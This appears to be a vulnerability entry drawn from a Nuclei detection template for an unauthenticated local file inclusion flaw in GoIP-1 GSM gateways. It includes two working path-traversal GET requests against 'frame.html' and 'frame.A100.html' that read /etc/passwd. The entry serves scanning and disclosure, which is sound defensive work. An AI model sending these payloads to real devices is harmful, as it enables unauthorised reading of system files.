# Vulnerability: GoIP-1 GSM - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`goip-1-lfi.yaml`)

## Description
GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html' is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
GET {{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

